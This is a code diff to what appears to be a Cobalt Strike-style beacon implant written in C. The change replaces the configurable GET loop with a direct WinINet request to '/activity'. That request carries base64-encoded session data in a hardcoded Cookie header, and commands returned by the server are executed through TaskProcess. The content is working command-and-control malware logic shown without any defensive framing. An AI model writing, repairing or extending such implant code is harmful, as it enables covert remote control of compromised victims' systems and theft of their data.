@@ -131,31 +131,44 @@ STRATEGY strategy = { 0, 0, 0 };
 		if (BeaconIsExpired())
 			BeaconInterrupt();
 
-		char uris[256];
-		strncpy(uris, S_URIS_GET, sizeof(uris) - 1);
-		uris[sizeof(uris) - 1] = 0;
-		char* usave = NULL;
-		char* uri = strtok_s(uris, ",", &usave);
-		char* urisave2 = NULL;
-		char* uriTok = strtok_s(uri, " ", &urisave2);
-		int n = -1;
-		while (uriTok != NULL) {
-			OBTRACE("main: GET attempt");
-			n = NetworkGet(uriTok, &gSession, data, OB_MAX_GET);
-			OBTRACE("main: GET returned");
-			if (n >= 0)
-				break;
-			uriTok = strtok_s(NULL, " ", &urisave2);
+		/* direct GET: hardcoded Cookie header (bypasses transform) */
+		{ char tb[64]; sprintf(tb, "NETGET: direct start"); OBTRACE(tb); }
+		char b64[512]; memset(b64, 0, sizeof(b64));
+		int b64len = 0;
+		{ const char* b64c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+		  unsigned char* raw = (unsigned char*)gSession.data;
+		  int rawlen = gSession.length;
+		  int i;
+		  for (i = 0; i < rawlen; i += 3) {
+		    unsigned int v = (raw[i] << 16) | ((i+1 < rawlen ? raw[i+1] : 0) << 8) | (i+2 < rawlen ? raw[i+2] : 0);
+		    b64[b64len++] = b64c[(v >> 18) & 0x3F];
+		    b64[b64len++] = b64c[(v >> 12) & 0x3F];
+		    b64[b64len++] = (i+1 < rawlen) ? b64c[(v >> 6) & 0x3F] : '=';
+		    b64[b64len++] = (i+2 < rawlen) ? b64c[v & 0x3F] : '=';
+		  }
+		  b64[b64len] = 0;
 		}
-		if (n < 0) {
-			host = StrategyPickDomain(S_DOMAINS, TRUE, strategy);
-			if (host != NULL)
-				NetworkConfigureHttp(host, S_PORT_HTTP, OB_AGENT);
+		char headers[1024]; memset(headers, 0, sizeof(headers));
+		sprintf(headers, "Cookie: %s\r\n", b64);
+		{ char tb[128]; sprintf(tb, "NETGET: hdrlen=%d b64[0..15]=%.15s", (int)strlen(headers), b64); OBTRACE(tb); }
+		HINTERNET hReq = HttpOpenRequestA(gInternetConnect, "GET", "/activity", NULL, NULL, NULL, gNetworkOptions, &gContext);
+		if (hReq) {
+			BOOL sent = HttpSendRequestA(hReq, headers, (DWORD)strlen(headers), NULL, 0);
+			{ char tb[128]; sprintf(tb, "NETGET: direct sent=%d gle=%lu", sent, (unsigned long)GetLastError()); OBTRACE(tb); }
+			if (sent) {
+				char* tdata = (char*)malloc(OB_MAX_GET);
+				DWORD bytesAvail = 0;
+				if (InternetQueryDataAvailable(hReq, &bytesAvail, 0, 0) && bytesAvail > 0 && bytesAvail < OB_MAX_GET) {
+					DWORD bytesRead = 0;
+					if (InternetReadFile(hReq, tdata, bytesAvail, &bytesRead) && bytesRead > 0) {
+						TaskProcess(tdata, bytesRead);
+						OBTRACE("NETGET: tasks processed");
+					}
+				}
+				if (tdata) free(tdata);
+			}
+			InternetCloseHandle(hReq);
 		}
-		else if (n > 0) {
-			TaskProcess(data, n);
-		}
-
 		NetworkPost(S_URI_POST);
 
 		int sleepMs = gSleepTime;
